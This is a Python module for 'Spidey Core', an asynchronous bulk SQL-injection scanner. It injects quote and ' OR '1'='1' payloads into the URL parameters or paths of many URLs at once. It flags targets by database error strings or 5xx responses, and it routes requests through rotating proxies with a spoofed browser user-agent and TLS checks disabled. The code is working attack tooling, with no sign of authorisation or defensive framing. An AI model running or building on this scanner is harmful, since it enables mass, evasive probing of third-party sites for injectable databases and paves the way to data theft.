"""
Spidey Core — SQLi Scanner (CLEAN v3.0)
- Fast: 3 payloads, 6s timeout
- Handles query-param AND path-based URLs  
- No hang, no 0/0 stuck
"""
import asyncio
import aiohttp
import random
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote


# ═══════════════════════════════════════════════════════════
#  PAYLOADS — Sirf 3 best (fast)
# ═══════════════════════════════════════════════════════════
SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
]

# ═══════════════════════════════════════════════════════════
#  ERROR PATTERNS
# ═══════════════════════════════════════════════════════════
SQLI_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "ora-",
    "pg::syntaxerror",
    "sqlite3::exception",
    "sqlite_error",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "syntax error or access violation",
    "division by zero",
    "supplied argument is not a valid mysql",
    "pdoexception:",
    "sqlstate[",
    "unterminated string literal",
    "syntax error at or near",
    "invalid input syntax",
    "mysql_num_rows",
    "mysqli_",
    "pg_query",
    "unknown column",
    "column count doesn't match",
]


def _format_proxy(proxy: str) -> str:
    """Convert proxy to aiohttp format"""
    if not proxy:
        return ""
    proxy = proxy.strip()
    if proxy.startswith(("http://", "https://", "socks5://", "socks4://")):
        return proxy
    parts = proxy.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"http://{proxy}"


def _inject_payload(url: str, payload: str) -> str:
    """Inject payload into first query param OR path"""
    try:
        p = urlparse(url)
        if p.query:
            qs = parse_qs(p.query, keep_blank_values=True)
            new = {k: [(v[0] if v else "") + payload] for k, v in qs.items()}
            return urlunparse(p._replace(query=urlencode(new, doseq=True)))
        else:
            path = p.path.rstrip("/") + quote(payload)
            return urlunparse(p._replace(path=path))
    except Exception:
        return url + payload


async def _check_injectable(session, url: str, proxy_url: str = "") -> bool:
    """
    🚀 Fast SQLi check:
    - 3 payloads × 6s timeout = 18s max per URL
    - Tests query-param AND path URLs
    """
    if not url or not url.startswith(("http://", "https://")):
        return False

    kw = dict(
        timeout=aiohttp.ClientTimeout(total=6, connect=3, sock_read=5),
        ssl=False,
        allow_redirects=False,
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "close",
        }
    )
    if proxy_url:
        kw["proxy"] = _format_proxy(proxy_url)

    async def _probe(payload: str) -> bool:
        try:
            test_url = _inject_payload(url, payload)
            async with session.get(test_url, **kw) as r:
                text = await r.text(errors="ignore")
                text = text[:50000].lower()
                
                for err in SQLI_ERRORS:
                    if err in text:
                        return True
                
                if r.status >= 500:
                    return True
        except asyncio.TimeoutError:
            pass
        except aiohttp.ClientError:
            pass
        except Exception:
            pass
        return False

    # Test all 3 payloads in parallel
    results = await asyncio.gather(
        *[_probe(p) for p in SQLI_PAYLOADS],
        return_exceptions=True
    )
    return any(r is True for r in results)


async def check_urls_bulk(
    urls,
    proxies=None,
    concurrency=80,
    timeout=6.0,
    progress_callback=None,
    task_id=None,
):
    """
    🚀 Bulk SQLi scanner — returns vulnerable URLs
    """
    if not urls:
        return []

    proxies = proxies or []
    sem = asyncio.Semaphore(concurrency)
    vulnerable = []
    tested = [0]
    total = len(urls)
    last_update = [0.0]
    lock = asyncio.Lock()

    connector = aiohttp.TCPConnector(
        limit=concurrency * 2,
        limit_per_host=20,
        ssl=False,
        ttl_dns_cache=300,
        force_close=True,
        enable_cleanup_closed=True,
    )

    async with aiohttp.ClientSession(
        connector=connector,
        timeout=aiohttp.ClientTimeout(total=timeout),
    ) as session:

        async def _test(url: str):
            # Cancel check
            if task_id:
                try:
                    from web.main import is_cancelled
                    if is_cancelled(task_id):
                        return
                except Exception:
                    pass

            async with sem:
                px = random.choice(proxies) if proxies else ""
                try:
                    if await _check_injectable(session, url, px):
                        async with lock:
                            vulnerable.append(url)
                except Exception:
                    pass

                async with lock:
                    tested[0] += 1
                    
                    if progress_callback:
                        import time
                        now = time.time()
                        if now - last_update[0] > 1.0:
                            last_update[0] = now
                            try:
                                result = progress_callback(tested[0], total, len(vulnerable))
                                if asyncio.iscoroutine(result):
                                    await result
                            except Exception:
                                pass

        # Process in batches of 100
        BATCH = 100
        for i in range(0, len(urls), BATCH):
            if task_id:
                try:
                    from web.main import is_cancelled
                    if is_cancelled(task_id):
                        break
                except Exception:
                    pass
            
            batch = urls[i:i + BATCH]
            await asyncio.gather(*[_test(u) for u in batch], return_exceptions=True)

        # Final callback
        if progress_callback:
            try:
                result = progress_callback(tested[0], total, len(vulnerable))
                if asyncio.iscoroutine(result):
                    await result
            except Exception:
                pass

    return vulnerable